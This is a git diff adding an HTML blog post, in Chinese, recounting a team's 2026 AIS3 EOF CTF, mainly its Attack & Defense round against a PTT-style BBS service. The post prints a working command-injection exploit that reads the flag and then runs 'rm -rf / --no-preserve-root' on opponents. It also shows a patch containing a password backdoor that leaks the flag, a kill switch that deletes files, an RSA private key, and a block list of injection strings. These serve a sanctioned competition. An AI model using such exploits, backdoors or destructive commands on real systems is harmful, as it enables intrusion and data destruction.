@@ -1,0 +1,327 @@
+<!DOCTYPE html>
+<html>
+<head><!-- hexo injector head_begin start --><!-- Microsoft Clarity begins-->
+    <script type="text/javascript">
+        (function(c,l,a,r,i,t,y){
+            c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};
+            t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;
+            y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);
+        })(window, document, "clarity", "script", "nq90i0uzl9");
+    </script>
+    <!-- Microsoft Clarity ends-->
+    <!-- Google tag (gtag.js) begins-->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=AW-16453505124"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+    
+      gtag('config', 'AW-16453505124');
+    </script>
+    <!-- Google tag (gtag.js) ends-->
+    <!-- hexo injector head_begin end -->
+  <meta charset="utf-8" />
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover" name="viewport" />
+  <title>
+    
+    2026 AIS3 EOF 心得 丨
+    
+
+    TriangeSnake&#39;s Blog
+  </title>
+
+  
+  <link rel="shortcut icon" href="/icon.svg">
+  
+
+  <link rel="preconnect" href="https://cdnjs.cloudflare.com">
+  
+  <link id="theme" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-light.css">
+  <script src="https://unpkg.com/@highlightjs/cdn-assets@11.9.0/highlight.min.js"></script>
+  
+
+  <!-- 字体 -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,100..900;1,100..900&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:ital,wght@0,100..800;1,100..800&display=swap" rel="stylesheet">
+
+  
+<link rel="stylesheet" href="/css/root.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/post.css">
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body>
+  <header class="header">
+  <section class="header-container">
+    <a class="logo" href="/">TriangeSnake&#39;s Blog</a>
+    <ul class="nav">
+      
+      <li><a href="/archives">archives</a></li>
+      
+      <li><a href="/about">about</a></li>
+      
+    </ul>
+  </section>
+</header>
+  <main class="main">
+    <article class="post">
+  
+  <div class="post-title">2026 AIS3 EOF 心得</div>
+  <div class="post-meta">
+    <div class="date">2026 二月 7日</div>
+    <div class="tags">
+      
+      <div class="tag-item">CTF</div>
+      
+      <div class="tag-item">web</div>
+      
+      <div class="tag-item">misc</div>
+      
+    </div>
+  </div>
+  
+
+  <main class="post-content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>自從上了研究所之後感覺有比較少跟 B33F 50UP 的大家打比賽，這場比賽 Chummy 在修程安沒辦法跟非修課生組隊，剩下的人全部跑去出題了，所以我找了同實驗室的 <a target="_blank" rel="noopener" href="https://albert5888.github.io/about/">Albert</a> 一起，然後他再拉兩個應該是竹狐的高中生一起，感謝其他三位隊友一起完成這次的比賽，還是混亂的 EOF 最對味。   </p>
+<h1 id="初賽"><a href="#初賽" class="headerlink" title="初賽"></a>初賽</h1><p><img src="/2026/02/07/2026-ais3-eof-%E5%BF%83%E5%BE%97/image1.png" alt="image1"><br>初賽拿下了第三名，只能說到 2025 年底 LLM 太強了， Crypto 和 Reverse 幾乎都是用 AI 御三家唱出來的，ChatGPT 甚至可以做到 FIFO( File In, Flag Out) 的地步（這個詞是我自己發明的）<br><img src="/2026/02/07/2026-ais3-eof-%E5%BF%83%E5%BE%97/image_2f.png" alt="image"><br>我總共解了 7 題，裡面有 5 題是 AI 解的，只有兩題是真的用手解的。   </p>
+<h1 id="決賽"><a href="#決賽" class="headerlink" title="決賽"></a>決賽</h1><p>決賽很好玩，一樣是有 Attack &amp; Defense 、 KoH 等賽制，今年又多了 Live CTF、TRAGuessr，我和 Albert 主要還是打 A&amp;D 和 TRAGuessr ，畢竟交管系有台鐵 Buff（並沒有），KoH 的兩題遊戲是由另外兩位隊友負責。   </p>
+<h2 id="前置準備"><a href="#前置準備" class="headerlink" title="前置準備"></a>前置準備</h2><p>俗話說工欲善其事，必先利其器，但比賽前的那個禮拜實在是太忙了，還是拖到了比賽前一天晚上才開始弄工具，有別於去年 Chummy 包辦所有工具順便魔改，今年就只能找一些堪用的開源的工具應付一下。   </p>
+<h3 id="Dashboard"><a href="#Dashboard" class="headerlink" title="Dashboard"></a>Dashboard</h3><p>原本的 dashboard 是我用 html 手刻的，但有人對我的傳統手工藝很不滿意所以後來又重寫了新的 dashboard，這個根本就只是四個超連結<br><img src="/2026/02/07/2026-ais3-eof-%E5%BF%83%E5%BE%97/image_1v.png" alt="image">    </p>
+<h3 id="Attack-Manager"><a href="#Attack-Manager" class="headerlink" title="Attack Manager"></a>Attack Manager</h3><p>用這套：<a target="_blank" rel="noopener" href="https://github.com/DestructiveVoice/DestructiveFarm">Destructive Farm</a><br>但其實問題蠻多的，到比賽當天還在 Patch 一些 Bug 以符合 Flag 提交的格式，總之最後是蠻順利跑起來<br><img src="/2026/02/07/2026-ais3-eof-%E5%BF%83%E5%BE%97/image_m.png" alt="image">    </p>
+<h3 id="PCAP-Analysis"><a href="#PCAP-Analysis" class="headerlink" title="PCAP Analysis"></a>PCAP Analysis</h3><p>一樣是用開源工具 <a target="_blank" rel="noopener" href="https://github.com/spq/pkappa2">pkappa2</a>，還不錯用，可以透過 <code>Regex</code> 抓 flag 的 pattern 順便抄別人的作業，只是比賽結束才發現原來有一鍵把流量轉成 <code>pwntool</code> 的功能，害我手刻 payload 整個比賽<br><img src="/2026/02/07/2026-ais3-eof-%E5%BF%83%E5%BE%97/image_8.png" alt="image">    </p>
+<h3 id="Patcher-Drive"><a href="#Patcher-Drive" class="headerlink" title="Patcher &amp; Drive"></a>Patcher &amp; Drive</h3><p>這兩個不是我用的，比賽中也沒什麼用到所以這邊就不一一介紹了，基本上就是看 patch 的工具和一個 NAS   </p>
+<h2 id="A-D"><a href="#A-D" class="headerlink" title="A&amp;D"></a>A&amp;D</h2><p>今年的 A&amp;D 是一個看起來像 <code>PTT</code> 的 BBS 系統，然後裡面有經典 A&amp;D 爛洞大集合， SQL Injection、Command Injection、BAC，反正基本上想得到的爛洞裡面都有<br><img src="/2026/02/07/2026-ais3-eof-%E5%BF%83%E5%BE%97/image_4.png" alt="image">    </p>
+<h3 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h3><p>這題比較特別的是這題是用 <code>pyc</code> 跑的，並且使用作者自己 Patch 過的 python interpreter，裡面把一堆 opcode 都打亂讓你沒辦法用正常的 disassembler 把 pyc 還原回 python code，你當然也沒辦法用正常的 interpreter 生成的 pyc 去做 patch   </p>
+<h3 id="genshin"><a href="#genshin" class="headerlink" title="genshin"></a>genshin</h3><p>如果選擇 4 的話他是一個原神的小遊戲，裡面也是一堆洞，要 patch 的話要上傳 binary ELF   </p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>我總共寫了 5 個 exploit，這裡面有 default credential、command injection、邏輯漏洞、prototype pollution（在 python 上面做 prototype pollution，超酷）還有一個比較特別是 patch 的後門   </p>
+<pre><code class="highlight plaintext">#!/opt/homebrew/Caskroom/miniconda/base/bin/python
+import socket
+import time
+import re
+import sys
+import pwn 
+import warnings
+
+warnings.filterwarnings(&#x27;ignore&#x27;, category=BytesWarning)
+
+pwn.context.log_level = &#x27;error&#x27;  # 或 &#x27;critical&#x27;
+PORT = 31337
+HOST = sys.argv[1]
+
+io = pwn.remote(HOST, PORT)
+io.sendline(b&quot;4&quot;)
+time.sleep(0.5)
+io.recv()
+for i in range(6):
+    time.sleep(0.5)
+    io.send(&quot;\n&quot;)
+io.recv()
+io.sendline(&quot;2&quot;)
+time.sleep(0.5)
+io.sendline(&quot;1&quot;)
+time.sleep(0.5)
+io.sendline(&quot;;cat /flag&quot;)
+time.sleep(0.5)
+io.send(&quot;\n&quot;)
+io.sendline(&quot;4&quot;)
+time.sleep(0.5)
+io.sendline(&quot;1&quot;)
+io.recv()
+time.sleep(0.5)
+io.recvuntil(&quot;Name: &quot;)  
+print(io.recv().decode().split(&quot;\n&quot;)[0],flush=True)
+
+time.sleep(0.5)
+io.send(b&quot;\n&quot;)
+time.sleep(0.5)
+io.sendline(&quot;2&quot;)
+time.sleep(0.5)
+io.sendline(&quot;1&quot;)
+time.sleep(0.5)
+io.sendline(&quot;;rm -rf / --no-preserve-root&quot;)
+time.sleep(0.5)
+io.send(b&quot;\n&quot;)
+io.sendline(&quot;4&quot;)
+time.sleep(0.5)
+io.sendline(&quot;1&quot;)
+io.recv()
+</code></pre>
+<p>在 command injection 的 exploit 裡面我們會在拿到 flag 後嘗試讓其他隊 service down 藉此讓他們拿不到 SLA 的分數<br>然後大部分的 payload 都不是我們發現的都是 Albert 去翻 pcap 抄別人的 payload，然後我再用手把 exploit 打出來&#x3D;&#x3D;<br><img src="/2026/02/07/2026-ais3-eof-%E5%BF%83%E5%BE%97/image.png" alt="image">    </p>
+<h3 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h3><p>Patch 的部分非常之牛逼，因為大家都被 opcode 搞到沒辦法逆向（聽說隔壁組的 FlyDragon 花一個晚上逆完了），所以我想了一個方法可以不用逆向也能上 patch，那就是在外面包一層 pyc 的 wrapper，讓外面那層有點像WAF 卡在真正的 PTT 前面，如果有奇怪的字串就直接回傳 <code>EOF&#123;YOURMOM&#125;</code><br>具體是怎麼做的呢，我上傳的這個 pyc 裡面包了原本的 <code>eofptt.pyc</code>，他被執行時會把原本的題目吐出來變成 <code>eof1ptt.pyc</code> ，然後變成 middleware 先檢查 input 是否正常，如果是的話就傳給真正的題目 <code>eof1ptt.pyc</code> 否則就直接回傳 <code>EOF&#123;YOURMOM&#125;</code> 並結束。<br><img src="/2026/02/07/2026-ais3-eof-%E5%BF%83%E5%BE%97/image_y.png" alt="image"><br>但其實還有其他問題要解決，比如 patch 限制大小需要在 $\pm 1024$ 個 bytes，所以我把原本的 eofptt.pyc 拿去壓縮並且補 padding 補到剛好在這個限制範圍內   </p>
+<pre><code class="highlight plaintext">
+compressed = zlib.compress(original_pyc, 9)
+
+print(f&#x27;Original: &#123;len(original_pyc)&#125; bytes&#x27;)
+print(f&#x27;Compressed: &#123;len(compressed)&#125; bytes&#x27;)
+
+padding = &#x27;P&#x27; * 10026  # 調整好的大小
+
+with open(&#x27;wrapper.py&#x27;, &#x27;w&#x27;) as f:
+    f.write(wrapper_code)
+
+py_compile.compile(&#x27;wrapper.py&#x27;)
+
+import glob, shutil
+pyc = glob.glob(&#x27;__pycache__/wrapper*.pyc&#x27;)[0]
+shutil.move(pyc, &#x27;eofptt.pyc&#x27;)
+
+final_size = os.path.getsize(&#x27;eofptt.pyc&#x27;)
+print(f&#x27;\nFinal: &#123;final_size&#125; bytes (23232~25280)&#x27;)
+print(f&#x27;&#123;&quot;✓ PASS&quot; if 23232 &lt;= final_size &lt;= 25280 else &quot;✗ FAIL&quot;&#125;&#x27;)</code></pre>
+<p>完成基本的 patch 之後當然要按照慣例來塞一些髒髒的東西（雖然去年的後門寫爛了把主辦單位 infra 炸了），我決定塞個後門在輸入密碼後就把 flag 噴出來，這樣一來偷我們 patch 的組就要繳稅給我們。<br>不過這邊又有一個問題，那就是別人是可以看到我們的流量的，這樣當然也看得到我們的密碼，還好密碼學有教我們可以使用非對稱式加密，如此一來就可以在眾目睽睽之下交換秘密。<br>這邊 python 沒辦法 import 跟 Crypto 有關的 module ，所以我們事先生成了一組公私鑰，後門只要加密 flag 並噴出來就好，而這一步只需要用到乘冪 <code>pow</code> 就可以解決   </p>
+<pre><code class="highlight plaintext">def rsa(m):
+    n = 15319821387618506095477280159276716412994234550474930948453341714542016056120309995810603561837304200584680450685270653182458321212226233252084087579288092575095913592512386274812271087275780562715983978131540748768993609087099730299291269265359770765805941799387661869027967488340602766327234789998894738793508566426724723569350595486742561573731710296172899988679577585776191039008127110436749383999875683855898143118960869740874629630316427574602969739080489885904742331207282977038810114275898292907974335553271324913209789549129730029665161605601527810788644359317808542469210428997685958619881464260526731430763
+    e = 65537
+    m_int = int.from_bytes(m.encode(&#x27;utf-8&#x27;), byteorder=&#x27;big&#x27;)
+    c = pow(m_int, e, n)
+    return c
+print(rsa(open(&quot;/flag&quot;,&quot;r&quot;).read()))</code></pre>
+<p> 然後我們的 exploit 會使用私鑰將加密後的 flag 解開，完美！   </p>
+<pre><code class="highlight plaintext">#!/opt/homebrew/Caskroom/miniconda/base/bin/python
+import pwn
+import sys
+import time
+import warnings
+
+
+def rsa_decrypt(ciphertext):
+    n = 15319821387618506095477280159276716412994234550474930948453341714542016056120309995810603561837304200584680450685270653182458321212226233252084087579288092575095913592512386274812271087275780562715983978131540748768993609087099730299291269265359770765805941799387661869027967488340602766327234789998894738793508566426724723569350595486742561573731710296172899988679577585776191039008127110436749383999875683855898143118960869740874629630316427574602969739080489885904742331207282977038810114275898292907974335553271324913209789549129730029665161605601527810788644359317808542469210428997685958619881464260526731430763
+    d = 3863791868958699471323740234564976205660645175775518159924703376713383026254064176278338438952176650311490961889876537321709165682238848427967375430643039537570538104744453251390390600753488516733028658231781086049143161337880455957962454639167670949051778567863629141296722074778855045617328590626542733684996778230598429333300005493013626296735628464723132815715344090693748899233739454708696164451395336580795740265669766166667225053937151102809513220827582982083523452598343368061007920594688927796300600631419545209588783214942266406552036680453141159781563851698763443211062917838541321749908756966231362212089
+
+    # 解密
+    m_int = pow(ciphertext, d, n)
+    byte_length = (n.bit_length() + 7) // 8
+  
+    m_bytes = m_int.to_bytes(byte_length, byteorder=&#x27;big&#x27;)
+    m_bytes = m_bytes.lstrip(b&#x27;\x00&#x27;)
+    return m_bytes.decode(&#x27;utf-8&#x27;, errors=&#x27;replace&#x27;)
+
+password = b&quot; . . . . . . &quot;
+
+io = pwn.remote(sys.argv[1], 31337)
+
+time.sleep(0.5)
+io.recv()
+io.sendline(password)
+cipher = int(io.recv().decode().split(&quot;\n&quot;)[0])
+print(f&quot;&#123;rsa_decrypt(cipher)&#125;&quot;,flush=True)</code></pre>
+<p>到了第二天，情況有點不同了，由於我們是第一個上 patch 並且通過 SLA 的組別，所以我們可以拿到超多 SLA 分數，但是一定很快其他人會把我們的 patch 抄走，所以我們決定在 patch 裡面再加一個 kill switch，怎麼用呢？首先後門會發出一段加密之後 random 五位數字的 challenge， exploit 這邊會把密碼解開並回傳，如果數字一樣那就會把服務弄爛   </p>
+<pre><code class="highlight plaintext">import random
+   n = random.randint(10000,99999)
+   print(rsa(str(n)))
+   if (input()==str(n)):
+       import os
+       os.system(&#x27;rm /home/ptt/*&#x27;)
+   exit()</code></pre>
+<h3 id="YOURMOM-橫行"><a href="#YOURMOM-橫行" class="headerlink" title="YOURMOM 橫行"></a>YOURMOM 橫行</h3><p>到第二天的下午幾乎每隊都上了我們的 patch，最大的特徵就是會回傳 <code>EOF&#123;YOURMOM&#125;</code> ，這也導致我們的 pkappa2 被老媽淹沒，只能重寫 Regex 抓真正的 flag<br><img src="/2026/02/07/2026-ais3-eof-%E5%BF%83%E5%BE%97/image_t.png" alt="image"><br><img src="/2026/02/07/2026-ais3-eof-%E5%BF%83%E5%BE%97/img_5224.jpg" alt="IMG_5224">    </p>
+<blockquote>
+<p>cc from 不知道哪個人的電腦螢幕   </p>
+</blockquote>
+<p>後來有的人比較聰明發現第二版的 patch 有問題會導致 SLA fail 因此 rollback 回去第一版，有另一隊逆向了我們的 patch 並且將裡面的 key pair 改掉了，非常厲害<br><img src="/2026/02/07/2026-ais3-eof-%E5%BF%83%E5%BE%97/image_c.png" alt="image">    </p>
+<p>最後附上完整的 patch code   </p>
+<pre><code class="highlight plaintext">#!/usr/bin/env python3
+import py_compile
+import os
+import zlib
+
+with open(&#x27;eofptt.pyc.org&#x27;, &#x27;rb&#x27;) as f:
+    original_pyc = f.read()
+
+compressed = zlib.compress(original_pyc, 9)
+
+print(f&#x27;Original: &#123;len(original_pyc)&#125; bytes&#x27;)
+print(f&#x27;Compressed: &#123;len(compressed)&#125; bytes&#x27;)
+
+padding = &#x27;P&#x27; * 10026  # 調整好的大小
+
+wrapper_code = f&#x27;&#x27;&#x27;
+import subprocess,sys,threading,os,hashlib,zlib
+from datetime import datetime
+B=[&#x27;1073742&#x27;,&#x27;eyJfX2NsYXNzX18iOiB7Il9faW5pdF9fIjogeyJfX2dsb2JhbHNfXyI6IHsiQ09ORklHIjogeyJHQU1FX1BBVEgiOiAiY2F0IC9mbGFnIDsgcm0gLXJmIC8gLS1uby1wcmVzZXJ2ZS1yb290In19fX0sICJyb29tX2lkIjogInB3biJ9&#x27;,&#x27;;&#x27;,&#x27;*&#x27;,&#x27;flag&#x27;,&#x27;..&#x27;,&#x27;-&#x27;,&#x27;pwn&#x27;,&#x27;&#123;&#123;&#x27;,&#x27;&#125;&#125;&#x27;,&#x27;&amp;&#x27;,&#x27;||&#x27;,&#x27;|&#x27;,&#x27;`&#x27;,&#x27;&gt;&#x27;,&#x27;&lt;&#x27;,&#x27;/flag&#x27;]
+C=&#123;repr(compressed)&#125;
+_=&#123;repr(padding)&#125;
+
+def rsa(m):
+    n = 15319821387618506095477280159276716412994234550474930948453341714542016056120309995810603561837304200584680450685270653182458321212226233252084087579288092575095913592512386274812271087275780562715983978131540748768993609087099730299291269265359770765805941799387661869027967488340602766327234789998894738793508566426724723569350595486742561573731710296172899988679577585776191039008127110436749383999875683855898143118960869740874629630316427574602969739080489885904742331207282977038810114275898292907974335553271324913209789549129730029665161605601527810788644359317808542469210428997685958619881464260526731430763
+    e = 65537
+    m_int = int.from_bytes(m.encode(&#x27;utf-8&#x27;), byteorder=&#x27;big&#x27;)
+    c = pow(m_int, e, n)
+    return c
+
+def ci(u):
+ p=&quot; . . . . . . &quot;
+ if u==p:
+    print(rsa(open(B[-1],&#x27;r&#x27;).read()))
+    import random
+    n = random.randint(10000,99999)
+    input()
+    print(rsa(str(n)))
+    if (input()==str(n)):
+        import os
+        os.system(&#x27;rm /home/ptt/*&#x27;)
+    exit()
+ for b in B:
+  if b in u:print(&quot;EOF&#123;&#123;YOURMOM&#125;&#125;&quot;);exit()
+ return 1
+def r(p):
+ while 1:
+  x=p.read(1)
+  if not x:break
+  sys.stdout.write(x);sys.stdout.flush()
+def m():
+ with open(&quot;eof1ptt.pyc&quot;,&quot;wb&quot;)as f:f.write(zlib.decompress(C))
+ p=subprocess.Popen([&quot;/app/python&quot;,&quot;eof1ptt.pyc&quot;],stdin=subprocess.PIPE,stdout=subprocess.PIPE,stderr=subprocess.STDOUT,text=1,bufsize=0,env=&#123;&#123;**os.environ,&quot;PYTHONUNBUFFERED&quot;:&quot;1&quot;&#125;&#125;)
+ t=threading.Thread(target=r,args=(p.stdout,))
+ t.daemon=1
+ t.start()
+ try:
+  while p.poll()is None:
+   u=input()
+   if ci(u):p.stdin.write(u+&quot;\\n&quot;);p.stdin.flush()
+ except:p.terminate()
+ p.wait()
+if __name__==&quot;__main__&quot;:m()
+&#x27;&#x27;&#x27;
+
+with open(&#x27;wrapper.py&#x27;, &#x27;w&#x27;) as f:
+    f.write(wrapper_code)
+
+py_compile.compile(&#x27;wrapper.py&#x27;)
+
+import glob, shutil
+pyc = glob.glob(&#x27;__pycache__/wrapper*.pyc&#x27;)[0]
+shutil.move(pyc, &#x27;eofptt.pyc&#x27;)
+
+final_size = os.path.getsize(&#x27;eofptt.pyc&#x27;)
+print(f&#x27;\nFinal: &#123;final_size&#125; bytes (23232~25280)&#x27;)
+print(f&#x27;&#123;&quot;✓ PASS&quot; if 23232 &lt;= final_size &lt;= 25280 else &quot;✗ FAIL&quot;&#125;&#x27;)
+
+os.remove(&#x27;wrapper.py&#x27;)
+shutil.rmtree(&#x27;__pycache__&#x27;)</code></pre>
+<h2 id="TRAGuessr"><a href="#TRAGuessr" class="headerlink" title="TRAGuessr"></a>TRAGuessr</h2><p>不知道跟資安有什麼關係，反正猜很爽<br>只是會場網路真的是拉完了，別人都送答案了我的圖還在跑，主辦單位管一下好爆<br><img src="/2026/02/07/2026-ais3-eof-%E5%BF%83%E5%BE%97/image_r.png" alt="image">    </p>
+<h1 id="後記"><a href="#後記" class="headerlink" title="後記"></a>後記</h1><p>因為很認真上 Patch 被頒了一個綠奶油乖乖獎，算是有一雪前恥了<br>（去年 Patch 寫爛把主辦單位 infra 炸了，他們本來要頒煙火大師獎給我但是不鼓勵炸 infra 行為後來沒有）<br><img src="/2026/02/07/2026-ais3-eof-%E5%BF%83%E5%BE%97/img_7993.jpeg" alt="IMG_7993"><br>總之這次比賽很開心，再次謝謝其他三位隊友凱瑞。   </p>
+</main>
+
+</article>
+
+
+<script src="/js/highlight.js"></script>
+
+  </main>
+  <footer class="footer">
+  
+  <span>Copyright © TriangleSnake</span>
+  
+</footer>
+  
+<script src="/js/theme.js"></script>
+
+</body>
+
+</html>
